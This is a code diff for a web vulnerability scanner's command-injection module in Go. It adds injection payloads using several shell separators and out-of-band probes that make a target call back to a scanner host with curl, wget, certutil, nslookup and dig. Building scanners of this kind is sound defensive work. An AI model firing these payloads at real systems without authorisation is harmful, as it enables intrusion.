@@ -16,27 +16,46 @@ import (
 )
 
 func (r *Runner) runCommandInjection(ctx context.Context, target ScanTarget) []ModuleFinding {
+	if strings.TrimSpace(target.Parameter) == "" {
+		return nil
+	}
+	if !isLikelyCommandInjectionParam(target.Parameter) {
+		r.emitSkip("command_injection", target, "parameter is not a command injection candidate")
+		return nil
+	}
 	var out []ModuleFinding
 	baseline, err := r.probeForModule(ctx, "command_injection", target, "akca-cmd-base")
 	if err != nil {
-		return nil
+		baseline, err = r.cachedEmptyProbe(ctx, target)
+		if err != nil {
+			r.emitSkip("command_injection", target, "baseline and empty-request fallback failed: "+err.Error())
+			return nil
+		}
 	}
 	timingBase := r.calibrateTargetTimingForModule(ctx, "command_injection", target)
 	sleepSec := timingblind.RecommendSleepSec(timingBase)
-	windows := strings.Contains(strings.ToLower(r.techDatabaseHint(target.EndpointURL)+" "+target.EndpointURL), "windows")
+	lowerHints := strings.ToLower(r.techDatabaseHint(target.EndpointURL) + " " + target.EndpointURL + " " + target.Profile.ContentType)
+	windows := strings.Contains(lowerHints, "windows") || strings.Contains(lowerHints, "iis") || strings.Contains(lowerHints, "asp.net") || strings.Contains(lowerHints, "aspx") || strings.Contains(lowerHints, ".asp")
 
 	probes := payloadsForClass(target.Payloads.Payloads, "command_injection")
 	primarySeed, verificationSeed := commandCanarySeeds(r.scanID, target)
-	canaryProbes := []payloadgen.Payload{commandCanaryProbe(payloadgen.Payload{}, windows, primarySeed, "primary")}
-	if len(probes) == 0 {
-		probes = append(canaryProbes, []payloadgen.Payload{
+	canaryProbes := commandCanaryProbes(windows, primarySeed, "primary")
+	probes = append(canaryProbes, probes...)
+	if len(probes) == len(canaryProbes) {
+		probes = append(probes, []payloadgen.Payload{
 			{Value: `|id`, VulnClass: "command_injection", Variant: "pipe", ExpectedSignal: "command_output"},
 			{Value: `;id`, VulnClass: "command_injection", Variant: "semicolon", ExpectedSignal: "command_output"},
+			{Value: `&&id`, VulnClass: "command_injection", Variant: "and", ExpectedSignal: "command_output"},
+			{Value: `\nid`, VulnClass: "command_injection", Variant: "newline", ExpectedSignal: "command_output"},
+			{Value: `$(id)`, VulnClass: "command_injection", Variant: "subshell", ExpectedSignal: "command_output"},
+			{Value: "`id`", VulnClass: "command_injection", Variant: "backtick", ExpectedSignal: "command_output"},
 		}...)
-	} else {
-		probes = append(canaryProbes, probes...)
 	}
-	for _, p := range probes {
+	earlySignalFound := false
+	for idx, p := range probes {
+		if idx >= 6 && !earlySignalFound && len(out) == 0 {
+			break
+		}
 		probePayload := p
 		if timingblind.IsTimeDelayPayload(p.Value, p.ExpectedSignal) {
 			probePayload.Value = timingblind.RewriteSleepDuration(p.Value, sleepSec)
@@ -59,7 +78,7 @@ func (r *Runner) runCommandInjection(ctx context.Context, target ScanTarget) []M
 			ctx, "command_injection", probeTarget, probePayload, baseline, rr,
 		); handled {
 			if runtimeFinding != nil {
-				r.recordFinding(&out, runtimeFinding, "command_injection", runtimeFinding.Evidence.Signal)
+				r.recordFinding(ctx, &out, runtimeFinding, "command_injection", runtimeFinding.Evidence.Signal)
 				return out
 			}
 			continue
@@ -71,7 +90,7 @@ func (r *Runner) runCommandInjection(ctx context.Context, target ScanTarget) []M
 		signal := detectCommandSignal(probePayload, rr.Response.Body, baseline.Response.Body, elapsed, timingBase, sleepSec)
 		if signal == "" && r.cfg.EnableOAST && r.oast != nil {
 			if oast := strings.TrimSpace(r.oastURL(ctx, "cmd-"+target.Parameter, target, "command_injection")); oast != "" {
-				if callbackPayload := commandOASTPayload(oast, windows); callbackPayload != "" {
+				for _, callbackPayload := range commandOASTProbes(oast, windows) {
 					r.sendOASTProbe(ctx, target, callbackPayload)
 				}
 			}
@@ -109,7 +128,9 @@ func (r *Runner) runCommandInjection(ctx context.Context, target ScanTarget) []M
 				f.Evidence.ResponseMarkers = []string{commandExpectedMarker(probePayload)}
 				f.Description += " Proof: the response contained a computed marker that was not present verbatim in the request."
 			}
-			r.recordFinding(&out, f, "command_injection", signal)
+			if r.recordFinding(ctx, &out, f, "command_injection", signal) {
+				return out
+			}
 		}
 	}
 
@@ -152,10 +173,33 @@ func commandOASTPayload(callbackURL string, windows bool) string {
 	if err != nil || u.Hostname() == "" {
 		return ""
 	}
+	host := u.Hostname()
 	if windows {
-		return "&nslookup " + u.Hostname()
+		return "&nslookup " + host
 	}
-	return ";nslookup " + u.Hostname()
+	return ";nslookup " + host
+}
+
+func commandOASTProbes(callbackURL string, windows bool) []string {
+	u, err := url.Parse(strings.TrimSpace(callbackURL))
+	if err != nil || u.Hostname() == "" {
+		return nil
+	}
+	host := u.Hostname()
+	if windows {
+		return []string{
+			"&nslookup " + host,
+			"&powershell -c \"Resolve-DnsName " + host + "\"",
+			"&certutil -urlcache -split -f http://" + host + "/akca",
+		}
+	}
+	return []string{
+		";nslookup " + host,
+		";curl http://" + host + "/akca",
+		";wget -q -O- http://" + host + "/akca",
+		";dig " + host,
+		";python3 -c \"import socket;socket.getaddrinfo('" + host + "',80)\"",
+	}
 }
 
 func detectCommandSignal(p payloadgen.Payload, body, baseline string, elapsedMs int64, timingBase timingblind.Baseline, sleepSec int) string {
@@ -174,24 +218,68 @@ func detectCommandSignal(p payloadgen.Payload, body, baseline string, elapsedMs 
 	return ""
 }
 
-func commandCanaryProbe(original payloadgen.Payload, windows bool, seed int, stage string) payloadgen.Payload {
-	separator := ";"
-	value := strings.TrimSpace(original.Value)
-	if strings.HasPrefix(value, "|") {
-		separator = "|"
-	} else if strings.HasPrefix(value, "&&") {
-		separator = "&&"
-	}
-	payload := fmt.Sprintf(`%sprintf 'AKCA_CMD_%%d' $((%d+1))`, separator, seed)
-	variant := "unix_computed_canary_" + stage
+func commandCanaryProbes(windows bool, seed int, stage string) []payloadgen.Payload {
 	if windows {
-		payload = fmt.Sprintf(`&cmd /V:ON /C "set /A x=%d+1&echo AKCA_CMD_!x!"`, seed)
-		variant = "windows_computed_canary_" + stage
+		return []payloadgen.Payload{
+			{
+				Value: fmt.Sprintf(`&cmd /V:ON /C "set /A x=%d+1&echo AKCA_CMD_!x!"`, seed),
+				VulnClass: "command_injection", Family: "command_injection",
+				Variant: "windows_computed_canary_" + stage, ExpectedSignal: "canary_output",
+				VerificationStrategy: "computed_output_pair", NoiseLevel: "high", RiskLevel: "active", Priority: 80, BudgetCost: 2,
+			},
+		}
 	}
+	separators := []struct{ prefix, suffix, name string }{
+		{";", "", "semicolon"},
+		{"|", "", "pipe"},
+		{"&&", "", "and"},
+		{"||", "", "or"},
+		{"\n", "", "newline"},
+		{"`", "`", "backtick"},
+		{"$(", ")", "subshell"},
+	}
+	var out []payloadgen.Payload
+	for _, sep := range separators {
+		out = append(out, payloadgen.Payload{
+			Value: fmt.Sprintf(`%sprintf 'AKCA_CMD_%%d' $((%d+1))%s`, sep.prefix, seed, sep.suffix),
+			VulnClass: "command_injection", Family: "command_injection",
+			Variant: "unix_computed_canary_" + sep.name + "_" + stage, ExpectedSignal: "canary_output",
+			VerificationStrategy: "computed_output_pair", NoiseLevel: "high", RiskLevel: "active", Priority: 80, BudgetCost: 2,
+		})
+	}
+	return out
+}
+
+func commandCanaryProbe(original payloadgen.Payload, windows bool, seed int, stage string) payloadgen.Payload {
+	if windows {
+		return payloadgen.Payload{
+			Value: fmt.Sprintf(`&cmd /V:ON /C "set /A x=%d+1&echo AKCA_CMD_!x!"`, seed),
+			VulnClass: "command_injection", Family: "command_injection",
+			Variant: "windows_computed_canary_" + stage, ExpectedSignal: "canary_output",
+			VerificationStrategy: "computed_output_pair", NoiseLevel: "high", RiskLevel: "active", Priority: 80, BudgetCost: 2,
+		}
+	}
+	prefix, suffix := ";", ""
+	val := strings.TrimSpace(original.Value)
+	switch {
+	case strings.HasPrefix(val, "|"):
+		prefix = "|"
+	case strings.HasPrefix(val, "&&"):
+		prefix = "&&"
+	case strings.HasPrefix(val, "||"):
+		prefix = "||"
+	case strings.HasPrefix(val, "\n"):
+		prefix = "\n"
+	case strings.HasPrefix(val, "`"):
+		prefix, suffix = "`", "`"
+	case strings.HasPrefix(val, "$("):
+		prefix, suffix = "$(", ")"
+	}
+	payload := fmt.Sprintf(`%sprintf 'AKCA_CMD_%%d' $((%d+1))%s`, prefix, seed, suffix)
 	return payloadgen.Payload{
 		Value: payload, VulnClass: "command_injection", Family: "command_injection",
-		Variant: variant, ExpectedSignal: "canary_output", VerificationStrategy: "computed_output_pair",
-		NoiseLevel: "high", RiskLevel: "active", Priority: 80, BudgetCost: 2,
+		Variant: "unix_computed_canary_" + stage, ExpectedSignal: "canary_output",
+		VerificationStrategy: "computed_output_pair", NoiseLevel: "high", RiskLevel: "active", Priority: 80, BudgetCost: 2,
 	}
 }
 
@@ -211,4 +299,22 @@ func commandExpectedMarker(p payloadgen.Payload) string {
 		return ""
 	}
 	return fmt.Sprintf("AKCA_CMD_%d", seed+1)
+}
+
+func isLikelyCommandInjectionParam(param string) bool {
+	p := strings.ToLower(strings.TrimSpace(param))
+	if p == "" {
+		return false
+	}
+	switch p {
+	case "_", "t", "ts", "timestamp", "cb", "cache", "nocache", "v", "ver", "version",
+		"format", "lang", "locale", "theme", "sort", "order", "dir", "asc", "desc",
+		"limit", "offset", "page_size", "per_page", "count", "qty", "quantity",
+		"price", "amount", "total", "id", "user_id", "product_id", "item_id", "category_id",
+		"account_id", "org_id", "role_id", "status", "state", "is_active", "enabled",
+		"disabled", "color", "size", "width", "height", "lat", "lon", "lng", "zoom",
+		"utm_source", "utm_medium", "utm_campaign", "utm_term", "utm_content", "ref", "fbclid", "gclid":
+		return false
+	}
+	return true
 }
